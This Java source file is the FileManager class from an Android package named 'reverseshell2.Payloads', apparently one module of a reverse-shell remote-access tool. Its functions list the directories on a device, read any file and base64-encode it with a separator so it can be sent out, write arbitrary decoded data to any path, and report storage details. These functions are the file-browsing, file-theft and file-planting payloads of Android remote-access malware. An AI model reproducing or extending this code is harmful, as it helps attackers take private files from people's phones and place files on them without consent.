package com.example.reverseshell2.Payloads;

import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class FileManager {

    private static final String TAG = "FileManager";

    public static String listDirectory(String path) {
        StringBuilder result = new StringBuilder();
        try {
            File dir;
            if (path == null || path.isEmpty() || path.equals("/")) {
                dir = Environment.getExternalStorageDirectory();
            } else {
                dir = new File(path);
            }

            if (!dir.exists()) {
                return "ERROR: Path does not exist: " + path + "\n";
            }
            if (!dir.isDirectory()) {
                return "ERROR: Not a directory: " + path + "\n";
            }

            result.append("Directory: ").append(dir.getAbsolutePath()).append("\n");
            result.append("---\n");

            File[] files = dir.listFiles();
            if (files == null || files.length == 0) {
                result.append("(empty)\n");
            } else {
                for (File f : files) {
                    String type = f.isDirectory() ? "[DIR]  " : "[FILE] ";
                    String size = f.isFile() ? " (" + humanReadableSize(f.length()) + ")" : "";
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
                    String modified = sdf.format(new Date(f.lastModified()));
                    result.append(type).append(f.getName()).append(size).append("  ").append(modified).append("\n");
                }
            }
        } catch (Exception e) {
            result.append("ERROR: ").append(e.getMessage()).append("\n");
        }
        return result.toString();
    }

    public static String readFileAsBase64(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) return "ERROR: File not found: " + path;
            if (!file.isFile()) return "ERROR: Not a file: " + path;
            if (file.length() > 50 * 1024 * 1024) return "ERROR: File too large (>50MB): " + path;

            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int len;
            while ((len = fis.read(buffer)) != -1) {
                bos.write(buffer, 0, len);
            }
            fis.close();

            String encoded = Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT);
            return file.getName() + "|_|" + encoded;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public static String writeFileFromBase64(String path, String base64Data) {
        try {
            byte[] data = Base64.decode(base64Data, Base64.DEFAULT);
            File file = new File(path);
            file.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(data);
            fos.close();
            return "SUCCESS: Written " + data.length + " bytes to " + path;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public static String getDeviceStorageInfo() {
        StringBuilder sb = new StringBuilder();
        try {
            File internal = Environment.getDataDirectory();
            File external = Environment.getExternalStorageDirectory();

            sb.append("Internal Storage:\n");
            sb.append("  Total: ").append(humanReadableSize(internal.getTotalSpace())).append("\n");
            sb.append("  Free: ").append(humanReadableSize(internal.getFreeSpace())).append("\n");
            sb.append("  Used: ").append(humanReadableSize(internal.getTotalSpace() - internal.getFreeSpace())).append("\n\n");

            sb.append("External Storage (").append(external.getAbsolutePath()).append("):\n");
            sb.append("  Total: ").append(humanReadableSize(external.getTotalSpace())).append("\n");
            sb.append("  Free: ").append(humanReadableSize(external.getFreeSpace())).append("\n");
            sb.append("  Used: ").append(humanReadableSize(external.getTotalSpace() - external.getFreeSpace())).append("\n");
        } catch (Exception e) {
            sb.append("ERROR: ").append(e.getMessage());
        }
        return sb.toString();
    }

    private static String humanReadableSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        char unit = "KMGTPE".charAt(exp - 1);
        return String.format("%.1f %sB", bytes / Math.pow(1024, exp), unit);
    }
}
